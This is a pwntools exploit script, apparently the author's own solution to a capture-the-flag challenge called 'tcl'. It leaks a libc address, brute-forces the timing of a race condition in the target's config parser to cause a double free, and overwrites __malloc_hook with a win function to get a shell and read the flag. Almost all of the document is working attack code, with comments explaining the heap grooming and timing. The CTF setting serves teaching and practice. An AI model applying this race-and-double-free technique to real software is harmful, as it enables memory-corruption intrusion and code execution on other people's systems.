from pwn import *


binary = "./tcl"
elf = context.binary = ELF(binary, checksec=False)
libc = ELF("./libc.so.6", checksec=False)

gs = """
continue
"""


"""
Since this is a race condition with network jitter, there's a bit of brute force needed here.

Note that I did actually get it to work on the actual infrastructure during playtesting so I KNOW ITS SOLVABLE.

The `i` value was -16.
"""
for i in range(-50, 50):
    if args.REMOTE:
        p = remote("localhost", 5004)
    elif args.REMOTE2:
        p = remote("tcl.chal.cyberjousting.com", 1358)
    elif args.GDB:
        context.terminal = ["tmux", "splitw", "-h"]
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = elf.process()



    ### GET LEAK ###
    alarm = int(p.recvline().strip(),16)
    print(f"[+] alarm: {hex(alarm)}")
    libc_base = alarm - libc.sym['alarm']
    print(f"[+] libc_base: {hex(libc_base)}")



    ### FIRST CONFIG ###
    payload = b'#START\n'

    """
    I chose the same key for all the variables and a different integer for all the values so that
    only one heap chunk is allocated for the string "legoclones" and all other chunks are allocated
    for objects (increasing the likelihood that WHEN the race condition occurs, the chunk
    given to the new object is also in the `global` list).
    """
    for _ in range(93):
        payload += b'legoclones = '
        payload += str(random.randint(0, 0xfffffff)).encode()
        payload += b'\n'
    payload += b'#END'

    # print(payload)
    p.sendline(payload)



    ### SECOND CONFIG ###
    p.sendline(b'#START\nlegoclones = 1336')                # set legoclones string NOW so only the 1337 later overlaps
    if args.REMOTE or args.REMOTE2:
        sleep(5.45 + (i * 0.01))
    else: # simulate jitter
        sleep(5.29 + 0.07)
    p.sendline(b'legoclones = 1337')                        # exploit race condition (not set to NULL)

    """
    At this point, 0-5 should be taken up for some reason idk, and 4 other objects should be taken 
    up (legoclones + number). This leaves 90 possible spaces in between that we need to fill.
    """
    sleep(3)
    payload = b''
    for _ in range(89):
        payload += b'legoclones = '
        payload += str(random.randint(0, 0xfffffff)).encode()
        payload += b'\n'
    payload += b'#END'
    p.sendline(payload)

    # wait for the garbage collector to do the double free
    sleep(6)



    ### EXPLOIT DOUBLE FREE ###
    malloc_hook_addr = libc_base + libc.sym['__malloc_hook'] - 0x10
    win_addr = elf.sym['win']
    idx1 = 2
    idx2 = 39

    payload = b'#START\n'
    for _ in range(41):
        payload += b'legoclones = '
        if _ == idx1:
            payload += str(malloc_hook_addr).encode()
        elif _ == idx2:
            payload += str(win_addr).encode()
        else:
            payload += str(random.randint(0, 0xfffffff)).encode()
        payload += b'\n'
    # print(payload)
    p.sendline(payload)

    # clean up
    p.recvuntil(b'Config is valid\n')
    p.recvuntil(b'Config is valid\n')
    print("[+] Shell?")

    p.sendline(b'cat flag.txt')

    out = p.recvall(timeout=1)
    if b'Invalid line' not in out:
        print(out)
        p.interactive()
    p.close()